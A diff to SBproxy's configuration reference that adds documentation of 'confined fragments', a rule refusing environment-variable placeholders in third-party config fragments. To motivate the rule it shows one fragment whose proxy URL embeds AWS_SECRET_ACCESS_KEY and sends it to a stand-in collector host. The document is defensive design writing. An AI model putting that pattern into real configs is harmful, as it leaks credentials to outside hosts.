@@ -1,6 +1,6 @@
 # SBproxy Configuration Reference
 
-*Last modified: 2026-08-25*
+*Last modified: 2026-08-27*
 
 The complete configuration reference for SBproxy: every option, every field, every action type. Most snippets below are deliberately partial, a skeleton showing which keys nest where or one field in isolation, so they read fast but are not meant to be saved as-is and booted. For a config you can actually run, start from [`examples/`](../examples/) (one runnable `sb.yml` per feature) or a [use-case guide](README.md#solve-a-problem) that walks a complete file end to end; this page is where you look up a field once you know which one you need.
 
@@ -6371,6 +6371,143 @@ export API_KEY=my-secret-key
 sbproxy serve -f sb.yml
 ```
 
+### Confined fragments
+
+`${VAR}` above is resolved by a text pass that runs over the whole
+document before anything parses it. That is what makes it work in any
+field, and it is also its limit: the pass cannot tell one part of the
+document from another, so every byte of the file gets the same
+unrestricted read of the proxy's environment.
+
+That is the right trade while the operator who runs the proxy is also
+the person who wrote every line of the file. It stops being the right
+trade the moment a piece of the document comes from somewhere else, such
+as a config fragment a service team commits in its own repository and a
+platform team composes into the running config. Handing that team write
+access to a fragment would hand them a read of `AWS_SECRET_ACCESS_KEY`,
+because a fragment carrying
+
+```yaml
+action:
+  type: proxy
+  url: "https://collect.example/${AWS_SECRET_ACCESS_KEY}"
+```
+
+is a URL the proxy builds at compile time and dials at request time.
+
+So a fragment does not get that pass. It gets a confined one, and the
+rule is short: **a fragment resolves the inputs its caller binds, and
+reads nothing else.** No `${VAR}`. No `{{env.X}}`. No variable it was
+not given. A fragment that reaches for any of those fails the compile
+with a message naming the fragment, the field, and the variable, and the
+composed config never ships.
+
+Helm draws the boundary the same way. Chart authors get every function
+in the Sprig library except `env` and `expandenv`, which were removed
+because they would have let a third-party chart read the environment of
+the process rendering it; a chart parameterizes itself through
+`.Values`, which the person installing it supplies. Kubernetes draws it
+one layer down, where a container sees the variables its Pod spec
+enumerates and never the kubelet's.
+
+Binding an input is strictly more expressive than allowing a variable
+name, which is the other common design (decK, for instance, lets a state
+file read process variables that carry a `DECK_` prefix). A fragment
+that names `${DATABASE_URL}` has decided where the value comes from. A
+fragment that names the input `database_url` has not, so the operator
+can bind it from the environment on one deployment, from Vault on
+another, and from a literal in a test, without the fragment changing.
+
+#### What resolves and what is refused
+
+```mermaid
+flowchart TD
+    A["a placeholder in a config fragment"] --> B{"which form?"}
+    B --> V["{{vars.X}} or {{variables.X}}"]
+    B --> E["${VAR} or ${VAR:-default}"]
+    B --> T["{{env.X}}"]
+    B --> S["$${VAR}"]
+    B --> R["${args.x}, ${steps.x.y}, ${method}"]
+    B --> Q["{{request.x}}"]
+    V --> C{"bound by the caller?"}
+    C -->|yes| OK["resolved from the binding"]
+    C -->|no| N1["refused, naming X and the field"]
+    E --> N2["refused, naming VAR and the field,\nin every field including script bodies,\nand in mapping keys"]
+    T --> N3["refused, naming X and the field"]
+    S --> L1["left literal: the documented escape"]
+    R --> L2["left literal: runtime vocabulary"]
+    Q --> L3["left literal: bound per request"]
+```
+
+Two details in that diagram are worth spelling out, because both are
+places a narrower rule would leak.
+
+A `${VAR}` inside a `lua_script`, `js_script`, or `rego_module` body is
+refused like any other. Script bodies are exempt from the `{{ }}`
+interpolator, so a literal `{{` in a Lua string reaches the engine as
+written, but the pre-parse text pass has no such exemption and would
+substitute inside one. Write `$${VAR}` if a script genuinely needs those
+five characters, and note that the `$$` stays in the value.
+
+A `${VAR}` in a mapping *key* is refused too. The text pass substitutes
+into a key as readily as into a value, so a fragment could otherwise
+name a header after a credential.
+
+#### A worked fragment
+
+Take a fragment that a service team owns, with two inputs it expects the
+platform to bind:
+
+```yaml
+action:
+  type: proxy
+  url: "https://{{vars.upstream_host}}/v1"
+policies:
+  - type: rate_limiting
+    requests_per_second: "{{vars.limits.rps}}"
+transforms:
+  - type: lua
+    lua_script: |
+      -- no substitution runs in here, so a literal `{{` is safe
+      local tpl = "${args.request_id}"
+      return tpl
+```
+
+Bound with `upstream_host: orders.internal` and
+`limits: { rps: 200 }`, it resolves to `https://orders.internal/v1`, a
+rate limit of `200`, and a Lua body byte-for-byte unchanged. Three ways
+it can fail instead:
+
+| What the fragment writes | What happens |
+|---|---|
+| `url: "https://{{vars.upstream}}/v1"` with only `upstream_host` bound | refused, naming `upstream` and `action.url`, and listing the input names that *are* bound |
+| `authentication: { api_key: "${OPENAI_API_KEY}" }` | refused, naming `OPENAI_API_KEY` and `authentication.api_key` |
+| a request modifier setting `X-Region: "{{env.AWS_REGION}}"` | refused, naming `AWS_REGION` and `request_modifiers.0.headers.set.X-Region` |
+
+None of those messages carries the variable's value, because nothing on
+the confined path reads one.
+
+#### What this does not change
+
+Everything above the fragment boundary keeps today's behavior. A config
+file the operator wrote resolves `${VAR}` and `${VAR:-default}` exactly
+as [Environment variables](#environment-variables) describes, in every
+field. A config authority still reports the `${VAR}` references a
+publish leaves unresolved, and a subscriber still refuses to apply a
+bundle that leaves one unresolved on its own node rather than shipping
+the literal text as a value. A confined fragment never trips either,
+because it cannot carry one.
+
+Composition itself is still being built, so nothing in a stock `sb.yml`
+supplies a fragment yet. The boundary is documented here because it is
+the rule fragments will be held to, and because the same change made
+`sbproxy config print` and `sbproxy mcp lock` resolve `${VAR}` through
+the compiler's own pass rather than a near-copy of it: `$${VAR}` now
+stays literal in both, `${VAR:-default}` resolves to its default, and
+the MCP `${args.x}` and `${steps.x.y}` forms are left for the tool
+executor instead of being substituted at load.
+
+
 ---
 
 ## ACME / auto TLS
@@ -7185,4 +7322,6 @@ request_modifiers:
 Only trusted operators should be able to edit configuration that uses this
 form because a value resolved during compilation can be sent to an upstream.
 Use the secret reference backends for credentials instead of copying secrets
-into headers.
+into headers. A config fragment authored outside the runtime config repo is
+not a trusted operator, and `{{env.NAME}}` is refused there rather than
+resolved; see [Confined fragments](#confined-fragments).
